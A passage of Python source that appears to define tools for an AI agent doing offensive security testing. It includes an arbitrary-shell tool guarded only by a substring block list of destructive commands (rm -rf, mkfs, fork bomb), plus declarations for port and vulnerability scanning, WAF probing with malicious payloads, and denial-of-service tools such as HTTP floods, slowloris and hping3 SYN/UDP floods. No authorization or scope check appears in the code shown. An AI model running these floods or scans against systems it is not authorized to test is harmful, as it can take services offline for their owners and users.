        "timestamp": time.time(),
    }
    STATE.findings.append(finding)
    return {"logged": True, "finding_id": finding["id"], "total_findings": len(STATE.findings)}


async def run_custom_command(command: str, timeout: int = 60) -> dict:
    blocked = ["rm -rf", "mkfs", "dd if=", "> /dev/sd", ":(){ :|:&", "shutdown", "reboot", "halt", "init 0", "init 6"]
    for b in blocked:
        if b in command:
            return {"error": f"blocked_dangerous_command: contains '{b}'"}

    return await _run_cmd(["bash", "-c", command], timeout=min(timeout, 120))


TOOL_DECLARATIONS = [
    {
        "name": "detect_installed_tools",
        "description": "Detect which offensive security tools are installed on this system. Call this FIRST to know what weapons you have available.",
        "parameters": {"type": "object", "properties": {}},
    },
    {
        "name": "http_request",
        "description": "Send a single HTTP request. Returns status, headers, body preview, response time. Use for initial probing and fingerprinting.",
        "parameters": {
            "type": "object",
            "properties": {
                "url": {"type": "string"},
                "method": {"type": "string", "enum": ["GET", "POST", "PUT", "DELETE", "PATCH", "HEAD", "OPTIONS"]},
                "headers": {"type": "object"},
                "body": {"type": "string"},
                "timeout": {"type": "integer"},
                "follow_redirects": {"type": "boolean"},
            },
            "required": ["url"],
        },
    },
    {
        "name": "crawl_endpoints",
        "description": "Spider the website to discover all endpoints, forms, API routes. Returns URLs with response times to find heavy targets.",
        "parameters": {
            "type": "object",
            "properties": {
                "url": {"type": "string"},
                "depth": {"type": "integer"},
                "max_pages": {"type": "integer"},
            },
            "required": ["url"],
        },
    },
    {
        "name": "detect_tech",
        "description": "Fingerprint technology stack: server, framework, language, CDN, WAF, security headers.",
        "parameters": {
            "type": "object",
            "properties": {"url": {"type": "string"}},
            "required": ["url"],
        },
    },
    {
        "name": "nmap_scan",
        "description": "Run Nmap scan. Supports: service_version, syn_scan, udp_scan, aggressive, vuln_scan, os_detect, firewall_evasion. Can run NSE scripts.",
        "parameters": {
            "type": "object",
            "properties": {
                "target": {"type": "string"},
                "scan_type": {"type": "string", "enum": ["service_version", "syn_scan", "udp_scan", "aggressive", "vuln_scan", "os_detect", "firewall_evasion"]},
                "ports": {"type": "string", "description": "Port specification e.g. '80,443' or '1-1000'"},
                "scripts": {"type": "string", "description": "NSE scripts e.g. 'http-enum,http-headers'"},
                "extra_args": {"type": "string"},
            },
            "required": ["target"],
        },
    },
    {
        "name": "masscan_scan",
        "description": "Ultra-fast port scanner. Scans entire port ranges at high speed. Use for broad reconnaissance.",
        "parameters": {
            "type": "object",
            "properties": {
                "target": {"type": "string"},
                "ports": {"type": "string"},
                "rate": {"type": "integer", "description": "Packets per second (max 100000)"},
            },
            "required": ["target"],
        },
    },
    {
        "name": "nuclei_scan",
        "description": "Template-based vulnerability scanner. Detects CVEs, misconfigurations, exposures with thousands of community templates.",
        "parameters": {
            "type": "object",
            "properties": {
                "target": {"type": "string"},
                "severity": {"type": "string", "description": "e.g. 'critical,high,medium'"},
                "templates": {"type": "string", "description": "Specific template path or category"},
            },
            "required": ["target"],
        },
    },
    {
        "name": "nikto_scan",
        "description": "Web server vulnerability scanner. Checks for dangerous files, outdated software, misconfigurations.",
        "parameters": {
            "type": "object",
            "properties": {
                "target": {"type": "string"},
                "tuning": {"type": "string"},
            },
            "required": ["target"],
        },
    },
    {
        "name": "ffuf_fuzz",
        "description": "Fast web fuzzer. Directory bruteforce, parameter fuzzing, vhost discovery. Finds hidden endpoints and attack surface.",
        "parameters": {
            "type": "object",
            "properties": {
                "url": {"type": "string", "description": "URL with FUZZ keyword e.g. http://target/FUZZ"},
                "wordlist": {"type": "string"},
                "method": {"type": "string"},
                "filter_status": {"type": "string"},
                "extra_args": {"type": "string"},
            },
            "required": ["url"],
        },
    },
    {
        "name": "benchmark_endpoint",
        "description": "Measure endpoint performance with N sequential requests. Returns avg/p95/p99 latency. Find the slow expensive endpoints.",
        "parameters": {
            "type": "object",
            "properties": {
                "url": {"type": "string"},
                "method": {"type": "string"},
                "num_requests": {"type": "integer"},
                "headers": {"type": "object"},
                "body": {"type": "string"},
            },
            "required": ["url"],
        },
    },
    {
        "name": "test_rate_limit",
        "description": "Test if endpoint has rate limiting. Sends rapid requests and detects 429 responses.",
        "parameters": {
            "type": "object",
            "properties": {
                "url": {"type": "string"},
                "num_requests": {"type": "integer"},
                "delay_ms": {"type": "integer"},
            },
            "required": ["url"],
        },
    },
    {
        "name": "detect_waf",
        "description": "Detect WAF by sending malicious payloads (SQLi, XSS, traversal, XXE) and analyzing block responses.",
        "parameters": {
            "type": "object",
            "properties": {"url": {"type": "string"}},
            "required": ["url"],
        },
    },
    {
        "name": "http_flood",
        "description": "Layer 7 HTTP flood. Built-in async engine, no external tools needed. High concurrency request flood.",
        "parameters": {
            "type": "object",
            "properties": {
                "url": {"type": "string"},
                "method": {"type": "string"},
                "concurrent": {"type": "integer", "description": "Max 1000"},
                "duration_seconds": {"type": "integer", "description": "Max 120"},
                "headers": {"type": "object"},
                "body": {"type": "string"},
            },
            "required": ["url"],
        },
    },
    {
        "name": "slowhttptest_attack",
        "description": "Slow HTTP attacks using slowhttptest (or built-in fallback). Types: slowloris, slow_post, slow_read, range. These exhaust connection pools with minimal bandwidth.",
        "parameters": {
            "type": "object",
            "properties": {
                "url": {"type": "string"},
                "attack_type": {"type": "string", "enum": ["slowloris", "slow_post", "slow_read", "range"]},
                "num_connections": {"type": "integer", "description": "Max 5000"},
                "duration_seconds": {"type": "integer", "description": "Max 120"},
                "rate": {"type": "integer"},
            },
            "required": ["url"],
        },
    },
    {
        "name": "hping3_flood",
        "description": "Layer 4 packet flood using hping3. Types: syn, udp, icmp, ack, rst, xmas, fin. Raw packet-level attacks that bypass application layer defenses.",
        "parameters": {
            "type": "object",
            "properties": {
                "target": {"type": "string", "description": "Hostname or IP (no protocol)"},
                "port": {"type": "integer"},
                "flood_type": {"type": "string", "enum": ["syn", "udp", "icmp", "ack", "rst", "xmas", "fin"]},
                "duration_seconds": {"type": "integer", "description": "Max 60"},
                "extra_args": {"type": "string"},
            },
            "required": ["target"],
        },
    },
    {
        "name": "bombardier_load",
        "description": "High-performance HTTP load generator (Go). Precise metrics with JSON output. Supports HTTP/2.",
        "parameters": {
            "type": "object",
            "properties": {
                "url": {"type": "string"},
                "connections": {"type": "integer", "description": "Max 2000"},
                "duration_seconds": {"type": "integer", "description": "Max 120"},
                "method": {"type": "string"},
                "body": {"type": "string"},
                "rate": {"type": "integer", "description": "Fixed rate (0 = unlimited)"},
            },
            "required": ["url"],
        },
    },
    {
        "name": "vegeta_attack",
        "description": "Constant-rate HTTP load generator. Sends at EXACT rate regardless of response time — exposes how latency degrades under precise load.",
        "parameters": {
            "type": "object",
            "properties": {
                "url": {"type": "string"},
                "rate": {"type": "integer", "description": "Requests per second (max 10000)"},
                "duration_seconds": {"type": "integer"},
                "method": {"type": "string"},
                "headers": {"type": "object"},
                "body": {"type": "string"},
            },
            "required": ["url"],
        },
    },
    {
        "name": "wrk_benchmark",
        "description": "High-performance HTTP benchmark with Lua scripting. Low overhead, accurate latency measurement.",
        "parameters": {
            "type": "object",
            "properties": {
                "url": {"type": "string"},
                "threads": {"type": "integer"},
                "connections": {"type": "integer", "description": "Max 5000"},
                "duration_seconds": {"type": "integer"},
                "script": {"type": "string", "description": "Path to Lua script"},
            },
            "required": ["url"],
        },
    },
    {
        "name": "siege_load",
        "description": "Multi-threaded HTTP load testing and benchmarking.",
        "parameters": {
            "type": "object",
            "properties": {
                "url": {"type": "string"},
                "concurrent": {"type": "integer"},
                "duration_seconds": {"type": "integer"},
                "extra_args": {"type": "string"},
            },
            "required": ["url"],
        },
    },
    {
        "name": "sslyze_scan",
        "description": "SSL/TLS vulnerability scanner. Detects misconfigurations, weak ciphers, Heartbleed, ROBOT, etc.",
        "parameters": {
            "type": "object",
            "properties": {"target": {"type": "string"}},
            "required": ["target"],
        },
    },
    {
        "name": "dnsrecon_scan",
        "description": "DNS reconnaissance. Enumerate records, find subdomains, zone transfers.",
        "parameters": {
            "type": "object",
            "properties": {
                "domain": {"type": "string"},
                "scan_type": {"type": "string", "description": "std, brt, axfr, etc."},
            },
            "required": ["domain"],
        },
    },
    {
        "name": "check_alive",
        "description": "Quick health check. Is target responding? Measures degradation vs baseline.",
        "parameters": {
            "type": "object",
            "properties": {
                "url": {"type": "string"},
                "timeout": {"type": "integer"},
            },
            "required": ["url"],
        },
    },
    {
        "name": "log_finding",
        "description": "Record a security finding. Call this EVERY TIME you discover a vulnerability or weakness.",
        "parameters": {
            "type": "object",
            "properties": {
                "title": {"type": "string"},
                "severity": {"type": "string", "enum": ["CRITICAL", "HIGH", "MEDIUM", "LOW", "INFO"]},
                "description": {"type": "string"},
                "evidence": {"type": "string"},
                "recommendation": {"type": "string"},
            },
            "required": ["title", "severity", "description"],
        },
    },
    {
        "name": "run_custom_command",
        "description": "Run any shell command. Use for tools not directly integrated or for chaining commands. Dangerous commands are blocked.",
        "parameters": {
            "type": "object",
            "properties": {
                "command": {"type": "string"},
                "timeout": {"type": "integer"},
            },
            "required": ["command"],
        },
    },
]


TOOL_MAP = {
    "detect_installed_tools": detect_installed_tools,
    "http_request": http_request,
    "crawl_endpoints": crawl_endpoints,
    "detect_tech": detect_tech,
    "nmap_scan": nmap_scan,
    "masscan_scan": masscan_scan,
    "nuclei_scan": nuclei_scan,
    "nikto_scan": nikto_scan,
    "ffuf_fuzz": ffuf_fuzz,
    "benchmark_endpoint": benchmark_endpoint,
    "test_rate_limit": test_rate_limit,
    "detect_waf": detect_waf,
    "http_flood": http_flood,
    "slowhttptest_attack": slowhttptest_attack,
    "hping3_flood": hping3_flood,
    "bombardier_load": bombardier_load,
    "vegeta_attack": vegeta_attack,
    "wrk_benchmark": wrk_benchmark,
    "siege_load": siege_load,
    "sslyze_scan": sslyze_scan,
    "dnsrecon_scan": dnsrecon_scan,
    "check_alive": check_alive,
    "log_finding": log_finding,
    "run_custom_command": run_custom_command,
}
